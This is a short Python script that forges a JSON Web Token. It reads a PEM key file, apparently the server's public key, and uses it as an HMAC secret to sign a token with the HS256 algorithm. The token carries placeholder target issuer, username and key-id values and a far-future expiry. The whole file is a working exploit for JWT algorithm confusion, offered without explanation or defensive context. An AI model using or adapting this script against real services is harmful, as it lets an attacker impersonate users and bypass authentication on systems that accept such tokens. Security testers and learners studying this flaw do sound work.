import hmac
import hashlib
import base64
import json
import sys

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

pem_file = sys.argv[1]  # pass PEM filename as argument

with open(pem_file, "rb") as f:
    secret = f.read()

header = {
    "kid": "TARGET_KID_VALUE",
    "alg": "HS256"
}

payload = {
    "iss": "TARGET_ISSUER",
    "sub": "TARGET_USERNAME",
    "exp": 9999999999
}

header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())

signing_input = f"{header_b64}.{payload_b64}".encode()

signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
signature_b64 = b64url(signature)

token = f"{header_b64}.{payload_b64}.{signature_b64}"
print(token)
